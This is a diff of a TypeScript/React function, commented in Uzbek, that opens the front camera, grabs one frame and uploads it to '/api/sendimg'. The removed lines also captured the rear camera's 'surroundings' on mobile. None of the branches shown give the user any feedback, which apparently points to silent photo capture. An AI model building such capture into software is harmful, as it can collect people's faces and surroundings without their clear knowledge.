@@ -105,65 +105,44 @@ const canvasRef = useRef<HTMLCanvasElement>(null)
 
 
 const captureAndSendPhoto = async () => {
-  const isMobile = window.innerWidth <= 600;
-
-  let frontStream: MediaStream | null = null;
-  let backStream: MediaStream | null = null;
-
   try {
-    // Har doim old kamerani ochamiz (selfie)
-    frontStream = await navigator.mediaDevices.getUserMedia({
+    // Har doim old kamerani (selfie) ochamiz
+    const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
       audio: false,
     });
 
-    // Agar mobile bo'lsa — orqa kamerani ham sinab ko'ramiz
-    if (isMobile) {
-      try {
-        backStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "environment" },
-          audio: false,
-        });
-      } catch (err) {
-        console.log("Mobileda orqa kamera topilmadi yoki ruxsat berilmagan");
-        backStream = null;
-      }
-    }
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
 
-    const captureFromStream = async (stream: MediaStream): Promise<Blob> => {
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      video.play();
+    // Video tayyor bo'lishini kutamiz
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        setTimeout(resolve, 800); // yuz aniq chiqishi uchun biroz kutamiz
+      };
+    });
 
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => setTimeout(resolve, 800);
-      });
+    // Rasm olish
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) throw new Error("Canvas xatosi");
 
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      if (!ctx) throw new Error("Canvas xatosi");
-      ctx.drawImage(video, 0, 0);
+    ctx.drawImage(video, 0, 0);
 
-      return new Promise((resolve) => {
-        canvas.toBlob((blob) => resolve(blob!), "image/jpeg", 0.9);
-      });
-    };
+    // Kamerani o'chiramiz
+    stream.getTracks().forEach(track => track.stop());
 
-    // Rasmlarni olish
-    const selfieBlob = await captureFromStream(frontStream);
+    // Blob yaratamiz
+    const blob = await new Promise<Blob>((resolve) => {
+      canvas.toBlob((b) => resolve(b!), "image/jpeg", 0.9);
+    });
 
+    // Yuborish
     const formData = new FormData();
-    formData.append("selfie", selfieBlob, "selfie.jpg");
-
-    if (backStream && isMobile) {
-      const backBlob = await captureFromStream(backStream);
-      formData.append("environment", backBlob, "atrof.jpg");
-      formData.append("device", "mobile"); // backendda bilish uchun
-    } else {
-      formData.append("device", "desktop");
-    }
+    formData.append("photo", blob, "selfie.jpg");
 
     const res = await fetch("/api/sendimg", {
       method: "POST",
@@ -171,23 +150,19 @@ const captureAndSendPhoto = async () => {
     });
 
     if (res.ok) {
-      
-      
+     
     } else {
       const data = await res.json();
- 
+     
     }
 
   } catch (err: any) {
     console.error(err);
     if (err.name === "NotAllowedError") {
-     
+      
     } else {
-
+      
     }
-  } finally {
-    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
-    if (backStream) backStream.getTracks().forEach(t => t.stop());
   }
 };
 
